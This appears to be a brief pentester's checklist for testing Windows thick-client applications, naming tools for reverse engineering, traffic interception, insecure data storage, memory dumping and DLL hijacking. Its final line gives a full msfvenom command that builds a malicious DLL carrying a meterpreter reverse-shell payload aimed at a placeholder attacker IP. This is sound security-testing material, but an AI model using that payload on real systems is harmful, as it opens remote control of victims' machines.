dnspy - reverse engineering

Overall View
	cff explorer
	wireshark
	sysinternals suite - tcpview, procmon

Traffic Analysis
	echo mirage - inject into pid to see traffic, set rules optional
	burp suite
	mitm-relay +burp - requier python, install the requirements needed (requestd lib)
	wireshark

Insecure Data Storage
	strings.exe inside sysinternals suite

	dnspy - reverse engineer and search for interesting strings
	registryeditor -to view storage of sensitive in registry entries

Dumping connection string from memory
	process hacker tool - (download portable binaries for ease) available in source forge

DLL Hijacking
	procmon 
	dll malicious file using msfvenom
	cmd = msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER IP> lport=<attacker listening port> -a <x86, x64> -f dll > malicious.dll
